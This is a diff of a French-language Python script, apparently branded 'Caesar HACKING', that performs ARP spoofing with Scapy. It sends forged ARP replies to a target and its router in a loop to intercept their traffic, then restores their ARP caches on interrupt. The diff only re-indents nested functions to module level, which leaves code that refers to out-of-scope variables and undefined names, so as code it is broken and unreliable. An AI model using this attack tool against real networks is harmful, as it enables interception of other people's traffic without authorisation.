@@ -62,21 +62,22 @@ def arpspoof():
     destinationIP = targetIP
     sourceIP = input("Entrez votre adresse IP (pour reset lorsque vous aurez terminé) : ")
 
-    # Fonction pour rechercher la MAC
-    def recherche_mac(targetIP, interface):
-        pkt7 = Ether(dst="ff:ff:ff:ff:ff") / ARP(pdst=targetIP)
-        ans = srp1(pkt7, iface=interface, timeout=2)
-        if ans:
-            mac = ans[0][1].hwsrc
-            return str(mac)
-        else:
-            print("L'adresse MAC est inexistante")
+# Fonction pour rechercher la MAC
+def recherche_mac(targetIP, interface):
+      pkt7 = Ether(dst="ff:ff:ff:ff:ff") / ARP(pdst=targetIP)
+      ans = srp1(pkt7, iface=interface, timeout=2)
+      if ans:
+          mac = ans[0][1].hwsrc
+          return str(mac)
+      else:
+          print("L'adresse MAC est inexistante")
 
     # Utilisation de la fonction recherche_mac avec les arguments nécessaires
-    destinationMac = recherche_mac(targetIP, interface)
 
-    # Message de lancement
-    print(
+destinationMac = recherche_mac(targetIP, interface)
+
+# Message de lancement
+print(
         "##::::::::::'###::::'##::: ##::'######::'########:'##::::'##:'########:'##::: ##:'########::::\n"
         "##:::::::::'## ##::: ###:: ##:'##... ##: ##.....:: ###::'###: ##.....:: ###:: ##:... ##..:::::\n"
         "##::::::::'##:. ##:: ####: ##: ##:::..:: ##::::::: ####'####: ##::::::: ####: ##:::: ##:::::::\n"
@@ -87,28 +88,28 @@ def arpspoof():
         "........::..:::::..::..::::..:::......:::........::..:::::..::........::..::::..:::::..:::::::\n"
     )
 
-    def spoofer(targetIP, spoofIP):
-        packet = ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
-        send(packet, verbose=False)
+def spoofer(targetIP, spoofIP):
+      packet = ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
+      send(packet, verbose=False)
 
-    def restore(destinationIP, sourceIP):
-        packet = ARP(op=2, pdst=destinationIP, hwdst=getMac(destinationIP), psrc=sourceIP, hwsrc=sourceMAC)
-        send(packet, count=4, verbose=False)
+def restore(destinationIP, sourceIP):
+      packet = ARP(op=2, pdst=destinationIP, hwdst=getMac(destinationIP), psrc=sourceIP, hwsrc=sourceMAC)
+      send(packet, count=4, verbose=False)
 
-    packets = 0
-    try:
-        while True:
-            spoofer(targetIP, routeurIP)
-            spoofer(routeurIP, targetIP)
-            print("\rCaesar HACKING : [+] Envoie de paquets " + str(packets)),
-            sys.stdout.flush()
-            packets += 2
-            time.sleep(2)
-    except KeyboardInterrupt:
-        print("***********************************************************************")
-        print("\nInterrompre le Spoof en faisant CTRL + C------------ Retour à l'état normal..")
-        print("***********************************************************************")
-        print(
+packets = 0
+try:
+    while True:
+        spoofer(targetIP, routeurIP)
+        spoofer(routeurIP, targetIP)
+        print("\rCaesar HACKING : [+] Envoie de paquets " + str(packets)),
+        sys.stdout.flush()
+        packets += 2
+        time.sleep(2)
+except KeyboardInterrupt:
+      print("***********************************************************************")
+      print("\nInterrompre le Spoof en faisant CTRL + C------------ Retour à l'état normal..")
+      print("***********************************************************************")
+      print(
             "\n   _____    ___.   .__               __          __   "
             "\n  /  _  \   \_ |__ |__| ____   _____/  |_  _____/  |_ "
             "\n /  /_\  \   | __ \|  |/ __ \ /    \   __\/  _ \   __\""
@@ -116,13 +117,13 @@ def arpspoof():
             "\n\____|__  /  |___  /__|\___  >___|  /__|  \____/|__|  "
             "\n        \/       \/        \/     \/                  "
         )
-        print("***********************************************************************")
-        restore(targetIP, routeurIP)
-        restore(routeurIP, targetIP)
+      print("***********************************************************************")
+      restore(targetIP, routeurIP)
+      restore(routeurIP, targetIP)
 
 
 if __name__ == "__main__":
-    main()
+  main()
   
 #-----------------------------------------------------------------------------
 #------------------------------ PARTIE CODE ----------------------------------
